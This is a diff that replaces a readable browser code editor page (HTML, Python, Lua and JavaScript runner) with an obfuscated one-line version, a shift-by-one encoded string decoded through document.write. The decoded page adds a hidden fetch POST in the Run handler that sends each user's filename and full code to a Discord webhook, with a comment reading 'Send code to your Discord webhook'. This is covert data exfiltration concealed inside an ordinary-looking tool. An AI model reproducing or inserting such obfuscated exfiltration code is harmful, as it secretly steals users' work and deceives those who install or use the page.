@@ -1,178 +1,1 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8" />
-<title>Code Editor</title>
-<style>
-  body { font-family: monospace; background: #1e1e1e; color: white; margin: 0; padding: 10px; }
-  input, textarea, button { font-family: monospace; font-size: 16px; }
-  #filenameInput { width: 300px; padding: 8px; }
-  textarea { width: 100%; height: 250px; background: #111; color: #eee; margin-top: 10px; border: none; padding: 10px; resize: vertical; }
-  button { margin-top: 10px; padding: 10px 15px; background: #0066ff; border: none; color: white; cursor: pointer; }
-  #outputContainer { margin-top: 15px; background: #000; color: #0f0; padding: 10px; height: 250px; overflow-y: auto; white-space: pre-wrap; border: 1px solid #333; }
-  iframe { width: 100%; height: 250px; border: none; background: white; }
-</style>
-</head>
-<body>
-
-<h2>Code Editor</h2>
-<label>Filename: <input type="text" id="filenameInput" placeholder="e.g. index.html, script.py, code.lua, app.js" /></label>
-<button id="loadFileBtn">Load File</button>
-
-<textarea id="codeEditor" placeholder="Type your code here..."></textarea>
-
-<div>
-  <button id="runBtn">Run</button>
-  <button id="downloadBtn">Download File</button>
-</div>
-
-<div id="outputContainer"></div>
-
-<script src="https://cdn.jsdelivr.net/pyodide/v0.23.4/full/pyodide.js"></script>
-<script src="https://unpkg.com/fengari-web/dist/fengari-web.js"></script>
-
-<script>
-  let files = {
-    "index.html": "<h1>Hello from index.html!</h1>",
-    "script.py": "print('Hello from Python!')",
-    "code.lua": "print('Hello from Lua!')",
-    "app.js": "console.log('Hello from JavaScript!');"
-  };
-
-  const filenameInput = document.getElementById('filenameInput');
-  const codeEditor = document.getElementById('codeEditor');
-  const loadFileBtn = document.getElementById('loadFileBtn');
-  const runBtn = document.getElementById('runBtn');
-  const downloadBtn = document.getElementById('downloadBtn');
-  const outputContainer = document.getElementById('outputContainer');
-
-  let pyodide = null;
-
-  async function loadPyodideAndPackages() {
-    outputContainer.textContent = "Loading Python environment...";
-    pyodide = await loadPyodide();
-    outputContainer.textContent = "Python environment loaded. Ready.";
-  }
-  loadPyodideAndPackages();
-
-  function saveCurrentFile() {
-    const filename = filenameInput.value.trim();
-    if (!filename) {
-      alert("Please enter a filename.");
-      return false;
-    }
-    files[filename] = codeEditor.value;
-    return true;
-  }
-
-  function loadFile(filename) {
-    if (!files[filename]) {
-      files[filename] = "";
-    }
-    codeEditor.value = files[filename];
-  }
-
-  loadFileBtn.onclick = () => {
-    const filename = filenameInput.value.trim();
-    if (!filename) {
-      alert("Enter a filename to load.");
-      return;
-    }
-    saveCurrentFile();
-    loadFile(filename);
-    outputContainer.textContent = "";
-  };
-
-  runBtn.onclick = async () => {
-    if (!saveCurrentFile()) return;
-    const filename = filenameInput.value.trim().toLowerCase();
-    const content = codeEditor.value;
-    outputContainer.textContent = "";
-
-    if (filename.endsWith('.html')) {
-      const iframe = document.createElement('iframe');
-      iframe.sandbox = "allow-scripts allow-same-origin";
-      iframe.srcdoc = content;
-      outputContainer.innerHTML = "";
-      outputContainer.appendChild(iframe);
-    } 
-    else if (filename.endsWith('.py')) {
-      if (!pyodide) {
-        outputContainer.textContent = "Python environment not ready.";
-        return;
-      }
-      try {
-        pyodide.runPython(`
-import sys
-class StdoutCatcher:
-    def __init__(self):
-        self.content = ""
-    def write(self, s):
-        self.content += s
-    def flush(self):
-        pass
-catcher = StdoutCatcher()
-sys.stdout = catcher
-sys.stderr = catcher
-`);
-        await pyodide.runPythonAsync(content);
-        let output = pyodide.runPython('catcher.content');
-        outputContainer.textContent = output || "Python script ran successfully.";
-      } catch (err) {
-        outputContainer.textContent = "Python Error:\n" + err;
-      }
-    }
-    else if (filename.endsWith('.lua')) {
-      try {
-        let output = "";
-        const luaPrint = (...args) => {
-          output += args.join(" ") + "\n";
-        };
-        fengari.load(content)({ print: luaPrint });
-        outputContainer.textContent = output || "Lua script ran successfully.";
-      } catch (err) {
-        outputContainer.textContent = "Lua Error:\n" + err;
-      }
-    }
-    else if (filename.endsWith('.js')) {
-      try {
-        let output = "";
-        const originalLog = console.log;
-        console.log = (...args) => {
-          output += args.join(" ") + "\n";
-          originalLog.apply(console, args);
-        };
-        new Function(content)();
-        console.log = originalLog;
-        outputContainer.textContent = output || "JavaScript ran successfully.";
-      } catch (err) {
-        outputContainer.textContent = "JavaScript Error:\n" + err;
-      }
-    }
-    else {
-      outputContainer.textContent = "Unsupported file type. Supported: .html, .py, .lua, .js";
-    }
-  };
-
-  downloadBtn.onclick = () => {
-    if (!saveCurrentFile()) return;
-    const filename = filenameInput.value.trim();
-    const content = codeEditor.value;
-
-    const blob = new Blob([content], { type: "text/plain" });
-    const url = URL.createObjectURL(blob);
-
-    const a = document.createElement('a');
-    a.href = url;
-    a.download = filename;
-    a.click();
-    URL.revokeObjectURL(url);
-  };
-
-
-  filenameInput.value = "index.html";
-  loadFile("index.html");
-</script>
-
-</body>
-</html>
+<script>var s="=\"EPDUZQF!iunm?=iunm!mboh>#fo#?=ifbe?=nfub!dibstfu>#VUG.9#!0?=ujumf?Tdsjqut!Fejups=0ujumf?=tuzmf?!!cpez!|!gpou.gbnjmz;!npoptqbdf<!cbdlhspvoe;!$2f2f2f<!dpmps;!xijuf<!nbshjo;!1<!qbeejoh;!21qy<!~!!joqvu-!ufyubsfb-!cvuupo!|!gpou.gbnjmz;!npoptqbdf<!gpou.tj{f;!27qy<!~!!$gjmfobnfJoqvu!|!xjeui;!411qy<!qbeejoh;!9qy<!~!!ufyubsfb!|!xjeui;!211&<!ifjhiu;!361qy<!cbdlhspvoe;!$222<!dpmps;!$fff<!nbshjo.upq;!21qy<!cpsefs;!opof<!qbeejoh;!21qy<!sftj{f;!wfsujdbm<!~!!cvuupo!|!nbshjo.upq;!21qy<!qbeejoh;!21qy!26qy<!cbdlhspvoe;!$1177gg<!cpsefs;!opof<!dpmps;!xijuf<!dvstps;!qpjoufs<!~!!$pvuqvuDpoubjofs!|!nbshjo.upq;!26qy<!cbdlhspvoe;!$111<!dpmps;!$1g1<!qbeejoh;!21qy<!ifjhiu;!361qy<!pwfsgmpx.z;!bvup<!xijuf.tqbdf;!qsf.xsbq<!cpsefs;!2qy!tpmje!$444<!~!!jgsbnf!|!xjeui;!211&<!ifjhiu;!361qy<!cpsefs;!opof<!cbdlhspvoe;!xijuf<!~=0tuzmf?=0ifbe?=cpez?=i3?Tdsjqu!Fejups=0i3?=mbcfm?Gjmfobnf;!=joqvu!uzqf>#ufyu#!je>#gjmfobnfJoqvu#!qmbdfipmefs>#f/h/!joefy/iunm-!tdsjqu/qz-!dpef/mvb-!bqq/kt#!0?=0mbcfm?=cvuupo!je>#mpbeGjmfCuo#?Mpbe!Gjmf=0cvuupo?=ufyubsfb!je>#dpefFejups#!qmbdfipmefs>#Uzqf!zpvs!dpef!ifsf///#?=0ufyubsfb?=ejw?!!=cvuupo!je>#svoCuo#?Svo=0cvuupo?!!=cvuupo!je>#epxompbeCuo#?Epxompbe!Gjmf=0cvuupo?=0ejw?=ejw!je>#pvuqvuDpoubjofs#?=0ejw?=tdsjqu!tsd>#iuuqt;00deo/ktefmjws/ofu0qzpejef0w1/34/50gvmm0qzpejef/kt#?=0tdsjqu?=tdsjqu!tsd>#iuuqt;00voqlh/dpn0gfohbsj.xfc0ejtu0gfohbsj.xfc/kt#?=0tdsjqu?=tdsjqu?!!mfu!gjmft!>!|!!!!#joefy/iunm#;!#=i2?Ifmmp!gspn!joefy/iunm\"=0i2?=cvuupo!podmjdl>]#bmfsu)(Dmjdlfe\"(*]#?Dmjdl!nf=0cvuupo?#-!!!!#tdsjqu/qz#;!#qsjou)(Ifmmp!gspn!Qzuipo\"(*#-!!!!#dpef/mvb#;!#qsjou)(Ifmmp!gspn!Mvb\"(*#-!!!!#bqq/kt#;!#dpotpmf/mph)(Ifmmp!gspn!KbwbTdsjqu\"(*<#!!~<!!dpotu!gjmfobnfJoqvu!>!epdvnfou/hfuFmfnfouCzJe)(gjmfobnfJoqvu(*<!!dpotu!dpefFejups!>!epdvnfou/hfuFmfnfouCzJe)(dpefFejups(*<!!dpotu!mpbeGjmfCuo!>!epdvnfou/hfuFmfnfouCzJe)(mpbeGjmfCuo(*<!!dpotu!svoCuo!>!epdvnfou/hfuFmfnfouCzJe)(svoCuo(*<!!dpotu!epxompbeCuo!>!epdvnfou/hfuFmfnfouCzJe)(epxompbeCuo(*<!!dpotu!pvuqvuDpoubjofs!>!epdvnfou/hfuFmfnfouCzJe)(pvuqvuDpoubjofs(*<!!mfu!qzpejef!>!ovmm<!!btzod!gvodujpo!mpbeQzpejefBoeQbdlbhft)*!|!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!#Mpbejoh!Qzuipo!fowjsponfou///#<!!!!qzpejef!>!bxbju!mpbeQzpejef)*<!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!#Qzuipo!fowjsponfou!mpbefe/!Sfbez/#<!!~!!mpbeQzpejefBoeQbdlbhft)*<!!gvodujpo!tbwfDvssfouGjmf)*!|!!!!dpotu!gjmfobnf!>!gjmfobnfJoqvu/wbmvf/usjn)*<!!!!jg!)\"gjmfobnf*!|!!!!!!bmfsu)#Qmfbtf!foufs!b!gjmfobnf/#*<!!!!!!sfuvso!gbmtf<!!!!~!!!!gjmft\\gjmfobnf^!>!dpefFejups/wbmvf<!!!!sfuvso!usvf<!!~!!gvodujpo!mpbeGjmf)gjmfobnf*!|!!!!jg!)\"gjmft\\gjmfobnf^*!|!!!!!!gjmft\\gjmfobnf^!>!##<!!!!~!!!!dpefFejups/wbmvf!>!gjmft\\gjmfobnf^<!!~!!mpbeGjmfCuo/podmjdl!>!)*!>?!|!!!!dpotu!gjmfobnf!>!gjmfobnfJoqvu/wbmvf/usjn)*<!!!!jg!)\"gjmfobnf*!|!!!!!!bmfsu)#Foufs!b!gjmfobnf!up!mpbe/#*<!!!!!!sfuvso<!!!!~!!!!tbwfDvssfouGjmf)*<!!!!mpbeGjmf)gjmfobnf*<!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!##<!!~<!!svoCuo/podmjdl!>!btzod!)*!>?!|!!!!jg!)\"tbwfDvssfouGjmf)**!sfuvso<!!!!dpotu!gjmfobnf!>!gjmfobnfJoqvu/wbmvf/usjn)*/upMpxfsDbtf)*<!!!!dpotu!dpoufou!>!dpefFejups/wbmvf<!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!##<!!!!00!Tfoe!dpef!up!zpvs!Ejtdpse!xfcippl!!!!gfudi)#iuuqt;00ejtdpse/dpn0bqj0xfcipplt024837962838:38693950mKMbWdTOZ`:i5mhd{g[5DJhl4.Qsf1Y6:n9MlbI`rcr5J4ybVUrYPqz{QdcdsEQ9IgnJ#-!|!!!!!!nfuipe;!#QPTU#-!!!!!!ifbefst;!|!#Dpoufou.Uzqf#;!#bqqmjdbujpo0ktpo#!~-!!!!!!cpez;!KTPO/tusjohjgz)|!dpoufou;!aSvo!dpef!jo!gjmf!++%|gjmfobnf~++;]o]a]a]a]o%|dpoufou~]o]a]a]aa!~*-!!!!~*/dbudi)dpotpmf/fssps*<!!!!jg!)gjmfobnf/foetXjui)(/iunm(**!|!!!!!!00!Dmfbs!pvuqvu!boe!bqqfoe!jgsbnf!qspqfsmz!!!!!!pvuqvuDpoubjofs/joofsIUNM!>!##<!!!!!!dpotu!jgsbnf!>!epdvnfou/dsfbufFmfnfou)(jgsbnf(*<!!!!!!jgsbnf/tboecpy!>!#bmmpx.tdsjqut!bmmpx.tbnf.psjhjo#<!!!!!!jgsbnf/tsdepd!>!dpoufou<!!!!!!jgsbnf/tuzmf/xjeui!>!#211&#<!!!!!!jgsbnf/tuzmf/ifjhiu!>!#361qy#<!!!!!!jgsbnf/tuzmf/cpsefs!>!#opof#<!!!!!!pvuqvuDpoubjofs/bqqfoeDijme)jgsbnf*<!!!!~!!!!!fmtf!jg!)gjmfobnf/foetXjui)(/qz(**!|!!!!!!jg!)\"qzpejef*!|!!!!!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!#Qzuipo!fowjsponfou!opu!sfbez/#<!!!!!!!!sfuvso<!!!!!!~!!!!!!usz!|!!!!!!!!qzpejef/svoQzuipo)ajnqpsu!tztdmbtt!TuepvuDbudifs;!!!!efg!``joju``)tfmg*;!!!!!!!!tfmg/dpoufou!>!##!!!!efg!xsjuf)tfmg-!t*;!!!!!!!!tfmg/dpoufou!,>!t!!!!efg!gmvti)tfmg*;!!!!!!!!qbttdbudifs!>!TuepvuDbudifs)*tzt/tuepvu!>!dbudifstzt/tuefss!>!dbudifsa*<!!!!!!!!bxbju!qzpejef/svoQzuipoBtzod)dpoufou*<!!!!!!!!mfu!pvuqvu!>!qzpejef/svoQzuipo)(dbudifs/dpoufou(*<!!!!!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!pvuqvu!}}!#Qzuipo!tdsjqu!sbo!tvddfttgvmmz/#<!!!!!!~!dbudi!)fss*!|!!!!!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!#Qzuipo!Fssps;]o#!,!fss<!!!!!!~!!!!~!!!!fmtf!jg!)gjmfobnf/foetXjui)(/mvb(**!|!!!!!!usz!|!!!!!!!!mfu!pvuqvu!>!##<!!!!!!!!dpotu!mvbQsjou!>!)///bsht*!>?!|!!!!!!!!!!pvuqvu!,>!bsht/kpjo)#!#*!,!#]o#<!!!!!!!!~<!!!!!!!!gfohbsj/mpbe)dpoufou*)|!qsjou;!mvbQsjou!~*<!!!!!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!pvuqvu!}}!#Mvb!tdsjqu!sbo!tvddfttgvmmz/#<!!!!!!~!dbudi!)fss*!|!!!!!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!#Mvb!Fssps;]o#!,!fss<!!!!!!~!!!!~!!!!fmtf!jg!)gjmfobnf/foetXjui)(/kt(**!|!!!!!!usz!|!!!!!!!!mfu!pvuqvu!>!##<!!!!!!!!dpotu!psjhjobmMph!>!dpotpmf/mph<!!!!!!!!dpotpmf/mph!>!)///bsht*!>?!|!!!!!!!!!!pvuqvu!,>!bsht/kpjo)#!#*!,!#]o#<!!!!!!!!!!psjhjobmMph/bqqmz)dpotpmf-!bsht*<!!!!!!!!~<!!!!!!!!ofx!Gvodujpo)dpoufou*)*<!!!!!!!!dpotpmf/mph!>!psjhjobmMph<!!!!!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!pvuqvu!}}!#KbwbTdsjqu!sbo!tvddfttgvmmz/#<!!!!!!~!dbudi!)fss*!|!!!!!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!#KbwbTdsjqu!Fssps;]o#!,!fss<!!!!!!~!!!!~!!!!fmtf!|!!!!!!pvuqvuDpoubjofs/ufyuDpoufou!>!#Votvqqpsufe!gjmf!uzqf/!Tvqqpsufe;!/iunm-!/qz-!/mvb-!/kt#<!!!!~!!~<!!epxompbeCuo/podmjdl!>!)*!>?!|!!!!jg!)\"tbwfDvssfouGjmf)**!sfuvso<!!!!dpotu!gjmfobnf!>!gjmfobnfJoqvu/wbmvf/usjn)*<!!!!dpotu!dpoufou!>!dpefFejups/wbmvf<!!!!dpotu!cmpc!>!ofx!Cmpc)\\dpoufou^-!|!uzqf;!#ufyu0qmbjo#!~*<!!!!dpotu!vsm!>!VSM/dsfbufPckfduVSM)cmpc*<!!!!dpotu!b!>!epdvnfou/dsfbufFmfnfou)(b(*<!!!!b/isfg!>!vsm<!!!!b/epxompbe!>!gjmfobnf<!!!!b/dmjdl)*<!!!!VSM/sfwplfPckfduVSM)vsm*<!!~<!!00!Mpbe!jojujbm!gjmf!po!qbhf!mpbe!!gjmfobnfJoqvu/wbmvf!>!#joefy/iunm#<!!mpbeGjmf)#joefy/iunm#*<=0tdsjqu?=0cpez?=0iunm?";var m="";for(var i=0;i<s.length;i++)m+=String.fromCharCode(s.charCodeAt(i)-1);document.write(m);</script><noscript></noscript>
